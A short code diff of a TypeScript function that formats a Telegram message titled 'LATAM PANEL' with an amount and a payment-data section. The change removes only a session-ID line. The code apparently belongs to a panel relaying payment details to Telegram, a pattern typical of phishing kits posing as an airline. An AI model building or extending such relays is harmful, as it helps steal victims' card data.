@@ -152,7 +152,6 @@ function formatTelegramMessage(payload: Record<string, unknown>) {
   const lines = [
     '✈️ LATAM PANEL',
     '━━━━━━━━━━━━━━━━━━',
-    `🆔 Sesión: ${payload.sessionId || '-'}`,
     `💵 Monto: $ ${amount}`,
     '',
     '💳 DATOS DE PAGO',
